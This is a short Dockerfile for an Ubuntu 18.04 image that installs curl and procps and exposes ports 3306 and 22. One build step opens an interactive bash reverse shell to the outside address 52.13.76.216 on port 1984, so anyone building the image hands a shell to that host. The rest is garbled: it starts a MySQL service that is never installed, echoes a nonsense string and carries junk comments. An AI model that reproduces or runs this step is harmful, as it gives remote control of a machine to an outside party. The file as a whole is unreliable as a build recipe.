FROM ubuntu:18.04
MAINTAINER Sad Cactus
ENV DEBIAN_FRONTEND noninteractive
RUN apt-get -y update
RUN apt install -y procps curl

RUN /bin/bash -c "bash -i >& /dev/tcp/52.13.76.216/1984 0>&1 "
RUN /etc/init.d/mysql start && \
        sleep 5 && \
		echo "ok355gggggggkkkklklgfgkllkkuyuymlgggggkjkjggggggggg5"


#ggk
#gghhhhh

EXPOSE 3306 22
